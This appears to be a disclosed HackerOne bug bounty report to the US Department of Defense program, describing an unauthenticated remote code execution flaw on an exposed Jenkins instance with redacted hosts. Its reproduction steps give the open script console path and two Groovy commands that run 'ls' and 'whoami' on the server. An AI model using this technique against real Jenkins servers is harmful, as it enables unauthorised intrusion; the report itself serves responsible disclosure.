# Unauth RCE on Jenkins Instance at https://█████████/

## Report Details
- **Report ID**: 1125329
- **URL**: https://hackerone.com/reports/1125329
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2021-03-14T09:03:46.814Z
- **Disclosed**: 2021-03-24T20:55:35.664Z

## Reporter
- **Username**: brbsainath
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
**Description:**
Hi Team,

While Doing Recon on U.s Government Sites, I Found below asset Belongs to U.S Government (Please Check its SSL certificate to confirm or Please check attached  POC Video)
 █████████

https://███/

Attacker can execute Command Injection without Authentication.

## Impact

Unauth RCE

## System Host(s)
███

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
1. Navigate to https://███████/_script
2. Please execute below commands to confirm Unauth RCE.

             Commands:  println "ls".execute().text
                                         println "whoami".execute().text
#POC

Please check Attached POC Video to follow steps (If Required)

██████

## Suggested Mitigation/Remediation Actions




## Attachments
No attachments
